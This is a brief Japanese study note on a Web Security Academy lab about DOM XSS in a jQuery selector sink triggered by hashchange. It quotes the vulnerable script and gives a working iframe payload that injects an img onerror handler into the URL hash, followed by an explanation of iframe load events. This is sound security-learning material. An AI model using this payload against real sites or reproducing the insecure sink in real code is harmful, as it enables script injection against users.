
Date: 2025-09-22
Tags: 
Links: [[XSS]], [[WSA]]

***
## Lab: DOM XSS in jQuery selector sink using a hashchange event

1. URLのhash部分が変わったらトリガーされる仕様になっている。
```javascript
<script>
  $(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
  });
</script>
```

2. 
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#"
        onload="this.src += '<img src=x onerror=print()>'">
</iframe>
```

1. 親ページに`<iframe src="...">`がある → ブラウザは iframe の src 先を読みに行く。
2. iframe 内のページが読み込まれる（ナビゲーション完了）と、iframe 要素の load イベントが発火する。
3. 親ページ側に onload 属性か addEventListener('load', ...) があれば、そのハンドラが実行される（このハンドラは親ページのコンテキストで評価され、this は親の iframe 要素を指す）。
4. そのハンドラ内で this.src を書き換えると（例：this.src += '…'）、iframe の src が変わり **再度ナビゲーション** が発生する（新しい src に対して読み込みが起きる）。
5. 新しい読み込みが終わると再び iframe の load（＝親側の onload）が発火する → 必要なら同じ操作を繰り返せる。


***
# References